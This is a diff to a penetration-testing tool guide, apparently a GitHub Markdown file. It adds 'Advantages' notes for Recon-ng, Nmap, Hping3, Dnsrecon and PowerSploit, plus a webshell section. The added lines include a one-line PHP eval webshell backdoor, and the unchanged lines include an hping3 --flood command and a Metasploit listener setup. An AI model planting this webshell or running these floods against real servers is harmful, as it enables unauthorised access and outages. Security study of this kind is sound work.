@@ -48,6 +48,7 @@ run
 ```
 <img width="524" height="35" alt="image" src="https://github.com/user-attachments/assets/e4155220-4ab5-460c-8cab-a9668e34fc76" />
 
+> Advantages: Modular, data linkage, reporting, API integration, automated workflows
 - [渗透测试RECON-NG介绍](https://blog.csdn.net/weixin_42952508/article/details/124443273)
 
 ## 2 Nmap
@@ -69,6 +70,8 @@ nmap -sV -O <IP>
 ```
 <img width="1075" height="371" alt="image" src="https://github.com/user-attachments/assets/be96decc-17de-48ed-afab-bc586d67ee8a" />
 
+> Advantages: Automatic recognition, OS fingerprinting, NSE, intuitive results, suitable for asset mapping. Ideal for routine port scanning, service enumeration, initial vulnerability screening, and internal network topology
+
 - [Nmap完整使用教程](https://blog.csdn.net/wrjhs/article/details/147080972)
 
 ## 3 Hping3
@@ -88,6 +91,8 @@ sudo hping3 -S -p 80 -c 10 <IP>        //Scan port 80
 sudo hping3 -S -p 80 --flood <IP>      //
 ```
 <img width="623" height="96" alt="image" src="https://github.com/user-attachments/assets/68b35999-021e-42de-8f34-ebda382cd602" />
+
+> Advantages: Bottom layer outsourcing, custom flag placement, source IP forgery, sharding, firewall bypass, stress testing. Suitable for firewall rule verification, protocol stack fingerprinting, bypassing ban ping, fine port detection, and performance testing
 
 - [hping3全参数详细教程](https://blog.csdn.net/qq_24305079/article/details/144963291)
 
@@ -110,8 +115,9 @@ dnsrecon -d baidu.com -y      //Execute Yandex enumeration using standard enumer
 ```
 <img width="496" height="129" alt="image" src="https://github.com/user-attachments/assets/9de6f78c-b7dd-45cc-965c-9e47509adddd" />
 
-- [Dnsrecon全参数详细教程](https://www.bilibili.com/read/cv40056693/?opus_fallback=1)
+> Advantages: The most comprehensive DNS functionality, multi threading, strong subdomain explosion, perfect AXFR/reverse PTR, and structured results. Suitable for deep DNS reconnaissance, subdomain discovery, and zone transfer testing
 
+- [Dnsrecon全参数详细教程](https://www.bilibili.com/read/cv40056693/?opus_fallback=1)
 
 ### 5 Powersploit
 ## 5.1 Invoke-Portscan
@@ -153,9 +159,14 @@ set LPORT 443
 //Enable listening (continuously waiting for the session)
 run
 ```
+> This is a Windows post penetration tool, a pure PowerShell attack framework. It can be executed in the native Windows environment without the need to upload an exe. Memory execution, leaving no files.
 <img width="828" height="279" alt="image" src="https://github.com/user-attachments/assets/d20cdb51-b512-4f97-b7ed-ac99e588fe6d" />
 
 ### 6 Webshells
+> Webshell is a server backdoor script that includes one sentence Trojans and JSP/ASPX Trojans. Basic sentence: Trojan horse
+```
+<? php eval($_POST[cc123]) ?>
+```
 ## 6.1 Behinder
 > Github：https://github.com/rebeyond/Behinder
 > Ice Scorpion "is a dynamic binary encryption website management client, which emerged due to the increasing number of webshells based on traffic encryption.
